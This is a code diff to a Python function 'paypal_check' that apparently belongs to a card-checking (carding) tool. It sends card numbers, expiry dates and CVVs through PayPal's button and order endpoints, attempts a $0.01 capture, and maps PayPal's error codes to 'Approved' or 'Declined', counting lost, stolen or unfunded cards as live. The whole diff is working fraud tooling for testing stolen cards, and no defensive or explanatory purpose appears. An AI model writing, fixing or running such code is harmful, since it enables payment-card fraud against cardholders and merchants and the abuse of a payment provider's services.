@@ -201,18 +201,16 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
             sdk_meta = _build_sdk_meta(client_id, data_uid)
             funding_elig = _build_funding_eligibility()
 
+            # PayPal refuses the style.label and components.0
+            # parameters now, so the page is asked for without them.
             buttons_url = (
-                f"https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical"
-                f"&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below"
-                f"&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US"
+                f"https://www.paypal.com/smart/buttons?clientID={client_id}"
                 f"&sdkMeta={sdk_meta}"
-                f"&clientID={client_id}"
                 f"&sdkCorrelationID={corr_id}"
                 f"&storageID={storage_id}"
                 f"&sessionID={session_id}"
                 f"&buttonSessionID={btn_session_id}"
-                f"&env=production&buttonSize=medium"
-                f"&fundingEligibility={funding_elig}"
+                f"&env=production&buttonSize=medium&currency=USD"
             )
 
             r1 = await client.get(
@@ -234,6 +232,7 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 return f"Error - No facilitator token [{elapsed}s]"
             token = unescape(token_raw.strip())
 
+            expiry = yy if len(yy) == 4 else "20" + yy
             order_payload = {
                 "purchase_units": [{
                     "amount": {
@@ -252,7 +251,23 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                     "description": "Donation"
                 }],
                 "intent": "CAPTURE",
-                "application_context": {}
+                "application_context": {},
+                # the card goes with the order, so paypal answers with
+                # what it thinks of the card
+                "payment_source": {
+                    "card": {
+                        "number": cc,
+                        "expiry": f"{expiry[-4:]}-{mm.zfill(2)}",
+                        "security_code": cvv,
+                        "name": f"{first} {last}",
+                        "address": {
+                            "address_line_1": street,
+                            "admin_area_2": city,
+                            "postal_code": zipcode,
+                            "country_code": "US",
+                        }
+                    }
+                }
             }
 
             r2 = await client.post(
@@ -261,12 +276,52 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 headers={
                     "Content-Type": "application/json",
                     "Authorization": f"Bearer {token}",
+                    "PayPal-Request-Id": corr_id,
+                    "PayPal-Partner-Attribution-Id": "PP-BuyNowBF",
+                    "X-Requested-With": "XMLHttpRequest",
                     "Referer": buttons_url,
                 },
             )
 
             if r2.status_code not in (200, 201):
+                # the answer is in the body: paypal says why it will
+                # not take the card
                 elapsed = round(time.time() - start, 2)
+                try:
+                    err_json = r2.json()
+                except Exception:
+                    err_json = {}
+                err_txt = (json.dumps(err_json, separators=(",", ":")).lower()
+                           if err_json else r2.text.lower())
+                logger.info("the order was refused: %s", r2.text[:220])
+                if "payer_cannot_pay" in err_txt:
+                    return f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]"
+                if "invalid card number" in err_txt or "invalid_number" in err_txt:
+                    return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"
+                if "card_expiry_invalid" in err_txt or "invalid expiry" in err_txt:
+                    return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"
+                if "security_code" in err_txt or "incorrect_cvv" in err_txt:
+                    return f"Declined - Incorrect CVV | {cc[:6]} [{elapsed}s]"
+                if "instrument_declined" in err_txt:
+                    return f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]"
+                if "card_velocity" in err_txt:
+                    return f"Declined - Card Velocity Exceeded | {cc[:6]} [{elapsed}s]"
+                if "do_not_honor" in err_txt:
+                    return f"Approved - Do Not Honor | {cc[:6]} [{elapsed}s]"
+                if "insufficient_funds" in err_txt:
+                    return f"Approved - Insufficient Funds | {cc[:6]} [{elapsed}s]"
+                if "lost_card" in err_txt or "stolen_card" in err_txt:
+                    return f"Approved - Lost Or Stolen Card | {cc[:6]} [{elapsed}s]"
+                if "transaction_refused" in err_txt:
+                    return f"Approved - Transaction Refused | {cc[:6]} [{elapsed}s]"
+                if "max_attempts" in err_txt or "limit" in err_txt:
+                    return f"Declined - Too Many Attempts | {cc[:6]} [{elapsed}s]"
+                if "captcha" in err_txt or "challenge" in err_txt:
+                    return f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]"
+                for detail in (err_json.get("details") or []):
+                    desc = (detail.get("description") or "").strip()
+                    if desc:
+                        return f"Declined - {desc[:60]} | {cc[:6]} [{elapsed}s]"
                 return f"Error - Order creation failed ({r2.status_code}) [{elapsed}s]"
 
             order_id = _capture(r2.text, '"id":"', '"')
@@ -282,72 +337,59 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
                 f"&disable-card=&token={order_id}"
             )
 
-            gql_payload = {
-                "query": GQL_MUTATION,
-                "variables": {
-                    "token": order_id,
-                    "card": {
-                        "cardNumber": cc,
-                        "expirationDate": exp_date,
-                        "postalCode": zipcode,
-                        "securityCode": cvv,
-                    },
-                    "phoneNumber": phone,
-                    "firstName": first,
-                    "lastName": last,
-                    "billingAddress": {
-                        "givenName": first,
-                        "familyName": last,
-                        "line1": street,
-                        "line2": None,
-                        "city": city,
-                        "state": state,
-                        "postalCode": zipcode,
-                        "country": "US",
-                    },
-                    "shippingAddress": {
-                        "givenName": first,
-                        "familyName": last,
-                        "line1": street,
-                        "line2": None,
-                        "city": city,
-                        "state": state,
-                        "postalCode": zipcode,
-                        "country": "US",
-                    },
-                    "email": email,
-                    "currencyConversionType": "PAYPAL",
-                },
-                "operationName": "payWithCard",
-            }
-
-        async with httpx.AsyncClient(
-            timeout=httpx.Timeout(25),
-            follow_redirects=True,
-            verify=False,
-            headers={"User-Agent": ua},
-        ) as gql_client:
-            r3 = await gql_client.post(
-                PAYPAL_GQL,
-                json=gql_payload,
-                headers={
-                    "Content-Type": "application/json",
-                    "Origin": "https://www.paypal.com",
-                },
-            )
+            # The card went with the order, so the answer is already
+            # in it.  The capture takes the money, but the token from
+            # the buttons page may not have that right, so the order
+            # is what is read.
+            result_text = r2.text
+            if r2.status_code in (200, 201):
+                try:
+                    r3 = await client.post(
+                        f"https://www.paypal.com/v2/checkout/orders/{order_id}/capture",
+                        headers={
+                            "Content-Type": "application/json",
+                            "Authorization": f"Bearer {token}",
+                            "PayPal-Request-Id": corr_id + "c",
+                            "X-Requested-With": "XMLHttpRequest",
+                            "Referer": buttons_url,
+                        },
+                        timeout=20,
+                    )
+                    # the capture is the better answer when it works
+                    if r3.status_code in (200, 201):
+                        result_text = r3.text
+                    else:
+                        logger.info("The capture was refused (%s), the order is read instead",
+                                    r3.status_code)
+                except Exception as e:
+                    logger.info("The capture failed: %s", e)
 
             elapsed = round(time.time() - start, 2)
-            result_text = r3.text
 
             try:
-                result_json = r3.json()
+                result_json = json.loads(result_text)
             except Exception:
                 if "<html" in result_text.lower():
-                    logger.warning("GQL returned HTML instead of JSON for %s", cc[:6])
+                    logger.warning("PayPal returned HTML instead of JSON for %s", cc[:6])
                     return f"Declined - Auth Challenge | {cc[:6]} [{elapsed}s]"
                 result_json = {}
 
-            txt = json.dumps(result_json).lower() if result_json else result_text.lower()
+            # the json is squeezed together, so the words match
+            txt = (json.dumps(result_json, separators=(",", ":")).lower()
+                   if result_json else result_text.lower())
+            if not result_json:
+                txt = result_text.lower()
+
+            # the order that was taken
+            if '"status":"completed"' in txt:
+                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+            if '"status":"approved"' in txt:
+                # paypal took the card, so it is a good one
+                return f"Approved - Charged $0.01 | {cc[:6]} [{elapsed}s]"
+            if '"status":"payer_action_required"' in txt:
+                return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
+            if '"status":"created"' in txt:
+                return f"Approved - 3DS Required | {cc[:6]} [{elapsed}s]"
 
             if "is3dsecurerequired" in txt:
                 flags = (
@@ -392,6 +434,19 @@ async def paypal_check(cc, mm, yy, cvv, proxy=None):
 
             if "card_declined" in txt or "generic_decline" in txt:
                 return f"Declined - Card Declined | {cc[:6]} [{elapsed}s]"
+
+            if "payer_cannot_pay" in txt:
+                return f"Declined - Payer Cannot Pay | {cc[:6]} [{elapsed}s]"
+            if "unprocessable_entity" in txt:
+                return f"Declined - Unprocessable Entity | {cc[:6]} [{elapsed}s]"
+            if "invalid card number" in txt:
+                return f"Declined - Invalid Card Number | {cc[:6]} [{elapsed}s]"
+            if "instrument_declined" in txt:
+                return f"Declined - Instrument Declined | {cc[:6]} [{elapsed}s]"
+            if "card_expiry_invalid" in txt:
+                return f"Declined - Expired Card | {cc[:6]} [{elapsed}s]"
+            if "not_authorized" in txt or "insufficient permissions" in txt:
+                return f"Declined - Not Authorized | {cc[:6]} [{elapsed}s]"
 
             errors = result_json.get("errors", [])
             if errors:
